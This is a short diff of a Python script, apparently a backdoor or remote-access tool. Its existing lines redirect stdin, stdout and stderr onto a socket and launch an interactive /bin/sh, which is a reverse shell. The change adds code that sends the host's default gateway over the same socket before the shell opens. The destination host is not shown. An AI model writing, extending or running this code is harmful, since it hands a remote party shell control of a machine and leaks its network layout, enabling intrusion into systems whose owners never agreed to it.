@@ -4,6 +4,9 @@ import sys
 os.system("pip install psutil")
 import psutil
 import struct
+import platform
+import socket
+
 
 class Details:
     def __init__(self):
@@ -64,6 +67,8 @@ class Details:
         os.dup2(s.fileno(),0)
         os.dup2(s.fileno(),1)
         os.dup2(s.fileno(),2)
+        gateway = self.get_default_gateway()
+        s.send(gateway.encode())
         subprocess.call(["/bin/sh","-i"])
         
     
